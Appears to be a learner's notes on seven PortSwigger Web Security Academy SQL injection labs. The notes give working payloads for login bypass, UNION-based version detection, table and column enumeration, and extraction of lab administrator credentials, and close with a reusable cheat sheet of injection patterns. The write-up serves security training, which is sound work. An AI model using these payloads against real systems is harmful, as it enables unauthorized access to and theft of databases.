# SQL Injection — PortSwigger Web Security Academy Labs

## Lab 1 — Retrieval of Hidden Data

### Payload

```text
'+OR+1=1--
```

### Purpose

Used to modify the SQL condition so that the query evaluates to true and hidden data is returned.

---

## Lab 2 — Login Bypass

### Payload

**Username:**

```text
administrator'--
```

### Purpose

The `--` SQL comment sequence causes the remainder of the SQL query to be ignored, allowing authentication to be bypassed in the lab.

---

# Lab 3 — Determining the Database Version

## Oracle — Version Detection

### Payload

```text
Lifestyle'+UNION+SELECT+banner,null+FROM+v$version--
```

### Alternative Payload

```text
'UNION+SELECT+'abc','def'+FROM+dual--
```

### Notes

* `v$version` can be queried on Oracle databases to retrieve version information.
* `dual` is a special Oracle table commonly used when a query needs a `FROM` clause but does not require a real table.

---

# Lab 4 — Determining the Database Version

## MySQL

### Payload

```text
category=Pets'+union+select+@@version,+null--
```

### Result

```text
8.0.42-0ubuntu0.20.04.1
```

### Notes

The MySQL `@@version` variable returns the database server version.

---

# Lab 5 — Retrieving User Credentials

## Step 1 — Find the Users Table

### Payload

```sql
category=Pets' UNION SELECT table_name, null
FROM information_schema.tables--
```

### Result

```text
users_irmogl
```

---

## Step 2 — Find the Columns

### Payload

```sql
category=Pets' UNION SELECT column_name, null
FROM information_schema.columns
WHERE table_name='users_irmogl'--
```

### Relevant Columns

```text
username_bbelhs
password_iparfk
```

---

## Step 3 — Retrieve Username and Password

### Payload

```sql
UNION SELECT username_bbelhs, password_iparfk
FROM users_irmogl--
```

### Result

```text
Username: administrator
Password: o7txc5oq4u4ou6ctqz4d
```

### Lab URL

https://0aee00de047762e9858f75f1006d00e2.web-security-academy.net/filter?category=Pets%27+union+select+username_bbelhs,+password_iparfk+from+users_irmogl--

---

# Lab 6 — Oracle Database Enumeration

## Step 1 — Test UNION Injection

### Payload

```sql
Lifestyle' UNION SELECT 'abc', 'def' FROM dual--
```

### Lab URL

https://0a9500150457691481b7ad7000960092.web-security-academy.net/filter?category=Lifestyle%27+union+select+%27abc%27,+%27def%27+from+dual--

---

## Step 2 — Find Tables

### Payload

```sql
Lifestyle' UNION SELECT table_name, null
FROM all_tables--
```

### Lab URL

https://0a9500150457691481b7ad7000960092.web-security-academy.net/filter?category=Lifestyle%27+union+select+table_name,+null+from+all_tables--

### Relevant Table

```text
USERS_QMOFBE
```

---

## Step 3 — Find Columns

### Payload

```sql
Lifestyle' UNION SELECT column_name, null
FROM all_tab_columns
WHERE table_name='USERS_QMOFBE'--
```

### Lab URL

https://0a9500150457691481b7ad7000960092.web-security-academy.net/filter?category=Lifestyle%27+union+select+column_name,+null+from+all_tab_columns+where+table_name%3d%27USERS_QMOFBE%27--

### Relevant Columns

```text
USERNAME_UNOBAD
PASSWORD_IHKXAC
```

---

## Step 4 — Retrieve Credentials

### Payload

```sql
Lifestyle' UNION SELECT USERNAME_UNOBAD, PASSWORD_IHKXAC
FROM USERS_QMOFBE--
```

### Lab URL

https://0a9500150457691481b7ad7000960092.web-security-academy.net/filter?category=Lifestyle%27+union+select+USERNAME_UNOBAD,+PASSWORD_IHKXAC+from+USERS_QMOFBE--

### Result

```text
Username: administrator
Password: vghdekgp4ge8a65rkw6y
```

---

# Lab 7 — Determining the Number of Columns

## Step 1 — Test Three Columns

### Payload

```sql
Pets' UNION SELECT null, null, null--
```

### Lab URL

https://0a2a007c0354884d80b05d0000e80054.web-security-academy.net/filter?category=Pets%27+union+select+null,+null,+null--

---

## Step 2 — Test Which Column Accepts Text

### Payload

```sql
Gifts' UNION SELECT null, 'a', null--
```

### Lab URL

https://0a3000080369932f821bf74f00a600da.web-security-academy.net/filter?category=Gifts%27%20union%20select%20null%2c%20%27a%27%2c%20null--

### Test Value

```text
a
```

---

## Step 3 — Confirm the Text-Visible Column

### Payload

```sql
Gifts' UNION SELECT null, 'vbh22z', null--
```

### Lab URL

https://0a3000080369932f821bf74f00a600da.web-security-academy.net/filter?category=Gifts%27+union+select+null,+%27vbh22z%27,+null--

### Result

```text
vbh22z
```

### Conclusion

The query accepts **3 columns**, and the **second column** can display text.

---

# Quick Reference

| Lab   | Objective              | Key Technique                           |
| ----- | ---------------------- | --------------------------------------- |
| Lab 1 | Retrieve hidden data   | Boolean SQL injection                   |
| Lab 2 | Bypass login           | SQL comment                             |
| Lab 3 | Identify DB version    | Oracle `v$version`                      |
| Lab 4 | Identify DB version    | MySQL `@@version`                       |
| Lab 5 | Retrieve credentials   | `information_schema` enumeration        |
| Lab 6 | Retrieve credentials   | Oracle `all_tables` / `all_tab_columns` |
| Lab 7 | Determine column count | `UNION SELECT NULL` testing             |

## Useful SQL Injection Patterns

### Boolean Test

```sql
' OR 1=1--
```

### Login Bypass

```text
administrator'--
```

### UNION Column Count

```sql
' UNION SELECT NULL--
```

```sql
' UNION SELECT NULL,NULL--
```

```sql
' UNION SELECT NULL,NULL,NULL--
```

### MySQL Version

```sql
' UNION SELECT @@version,NULL--
```

### MySQL Table Enumeration

```sql
' UNION SELECT table_name,NULL
FROM information_schema.tables--
```

### MySQL Column Enumeration

```sql
' UNION SELECT column_name,NULL
FROM information_schema.columns
WHERE table_name='users'--
```

### Oracle Version

```sql
' UNION SELECT banner,NULL
FROM v$version--
```

### Oracle Table Enumeration

```sql
' UNION SELECT table_name,NULL
FROM all_tables--
```

### Oracle Column Enumeration

```sql
' UNION SELECT column_name,NULL
FROM all_tab_columns
WHERE table_name='USERS_TABLE'--
```

> **Note:** These payloads are documented here as notes from PortSwigger Web Security Academy practice labs. Use SQL injection techniques only in systems you are authorized to test.
